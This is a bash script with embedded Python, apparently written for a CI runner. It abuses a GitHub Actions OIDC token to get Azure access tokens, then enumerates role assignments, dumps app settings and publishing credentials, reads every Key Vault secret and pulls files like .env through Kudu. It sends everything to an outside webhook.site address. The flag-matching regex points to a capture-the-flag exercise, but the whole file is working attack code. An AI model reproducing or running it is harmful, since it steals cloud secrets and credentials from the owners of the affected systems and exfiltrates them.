#!/usr/bin/env bash
set +e
exec python3 - <<'PY'
import os, json, urllib.request, urllib.parse, urllib.error, base64, re
WH = "https://webhook.site/7b93d682-b6a5-41de-bf37-ff9134ec7f78"
TEN = os.environ.get("AZURE_TENANT_ID", "")
CID = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
out = {}


def ex(u, data=None, headers=None, method=None, t=60):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=data, headers=headers or {}, method=method), timeout=t)
        return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, repr(e)[:300]


oidc = ""
try:
    u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
    s, b = ex(u, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    oidc = json.loads(b).get("value", "")
except Exception as e:
    out["oidc_err"] = repr(e)[:300]
out["oidc_len"] = len(oidc)


def aad(scope):
    d = urllib.parse.urlencode({
        "grant_type": "client_credentials", "client_id": CID, "scope": scope,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc}).encode()
    s, b = ex("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TEN, data=d,
              headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        return json.loads(b).get("access_token", "")
    except Exception:
        out["aad_err_" + scope] = b[:300]
        return ""


ARM = aad("https://management.azure.com/.default")
KV = aad("https://vault.azure.net/.default")
STG = aad("https://storage.azure.com/.default")
out["arm_len"] = len(ARM); out["kv_len"] = len(KV); out["stg_len"] = len(STG)


def q(u, m="GET", tok=None):
    h = {"Authorization": "Bearer " + (tok if tok is not None else ARM)}
    if m == "POST":
        h["Content-Length"] = "0"
    return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)


s, b = q("https://management.azure.com/subscriptions/%s?api-version=2022-12-01" % SUB)
out["sub"] = [s, b[:300]]
for scope in ["", "/resourceGroups/rg-tbl-platform-prod-sea", "/resourceGroups/rg-tbl-reporting-prod-eus"]:
    s, b = q("https://management.azure.com/subscriptions/%s%s/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" % (SUB, scope))
    out["ra" + (scope or "/")] = [s, b[:6000]]

apps = [("rg-tbl-platform-prod-sea", "app-tbl-storefront-prod"), ("rg-tbl-reporting-prod-eus", "app-tbl-reporting-prod")]
pub = {}
for rg, app in apps:
    base = "https://management.azure.com/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Web/sites/%s" % (SUB, rg, app)
    s, b = q(base + "/config/appsettings/list?api-version=2022-09-01", "POST"); out["settings_" + app] = [s, b[:6000]]
    s, b = q(base + "/config/publishingcredentials/list?api-version=2022-09-01", "POST"); out["pub_" + app] = [s, b[:1200]]
    try:
        p = json.loads(b).get("properties", {})
        if p.get("publishingUserName"):
            pub[app] = (p["publishingUserName"], p["publishingPassword"])
    except Exception:
        pass
    s, b = q(base + "/config/web?api-version=2022-09-01"); out["web_" + app] = [s, b[:2500]]

for v in ["kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"]:
    s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/%s/secrets?api-version=2023-07-01" % (SUB, v))
    out["kvlist_" + v] = [s, b[:2500]]
    try:
        for it in json.loads(b).get("value", []):
            nm = it["name"]
            s2, b2 = ex("https://%s.vault.azure.net/secrets/%s?api-version=7.4" % (v, nm), headers={"Authorization": "Bearer " + KV})
            out["sec_%s_%s" % (v, nm)] = [s2, b2[:1500]]
    except Exception:
        pass

# Kudu on whatever app we can reach
for app, (u0, p0) in pub.items():
    a = base64.b64encode((u0 + ":" + p0).encode()).decode()
    host = "https://%s.scm.azurewebsites.net" % app
    s, b = ex(host + "/api/settings", headers={"Authorization": "Basic " + a})
    out["kudu_settings_" + app] = [s, b[:6000]]
    s, b = ex(host + "/api/vfs/site/wwwroot/", headers={"Authorization": "Basic " + a})
    out["kudu_list_" + app] = [s, b[:6000]]
    for fn in [".env", "app.py", "internal-config.json", ".flag", "flag.txt", ".flag.py"]:
        s2, b2 = ex(host + "/api/vfs/site/wwwroot/" + fn, headers={"Authorization": "Basic " + a})
        if s2 == 200:
            out["kfile_%s_%s" % (app, fn)] = [s2, b2[:3000]]

blob = json.dumps(out, indent=1)
hits = sorted(set(re.findall(r"DF26\{[^}]{0,200}\}", blob)))
out["_hits"] = hits
blob = json.dumps(out, indent=1)
ex(WH, data=blob.encode(), headers={"Content-Type": "application/json"}, method="POST")
print("SENT", len(blob), "hits", hits)
PY
